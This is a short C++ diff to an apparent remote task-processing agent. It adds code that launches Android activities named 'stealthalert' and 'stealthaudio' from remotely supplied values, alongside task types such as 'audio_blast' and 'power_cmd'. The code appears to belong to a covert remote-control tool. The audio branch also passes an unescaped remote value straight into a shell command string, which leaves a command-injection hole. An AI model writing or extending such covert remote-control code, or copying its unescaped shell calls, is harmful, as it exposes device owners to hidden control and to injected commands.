@@ -845,9 +845,19 @@ void process_tasks() {
             std::string state = get_json_val(response, "state");
             std::string text = get_json_val(response, "text");
             log_message("System alert received: state=" + state + " text=" + text);
+            if (!state.empty() || !text.empty()) {
+                std::vector<std::string> args = {"am", "start", "-n", "com.stealthalert/.AlertActivity", "--es", "title", state, "--es", "text", text};
+                bool started = run_command_no_output(args);
+                log_message(std::string("StealthAlert activity ") + (started ? "started" : "failed to start"));
+            }
         } else if (task == "audio_blast") {
             std::string play = get_json_val(response, "play");
             log_message("Audio blast request received: play=" + play);
+            if (!play.empty()) {
+                std::string cmd = "am start -n com.stealthaudio/.StealthAudioActivity --es action play --es volume \"" + play + "\"";
+                std::string output = exec_cmd(cmd);
+                log_message("Started StealthAudio activity: " + output);
+            }
         } else if (task == "power_cmd") {
             std::string action = get_json_val(response, "action");
             log_message("Power command received: action=" + action);
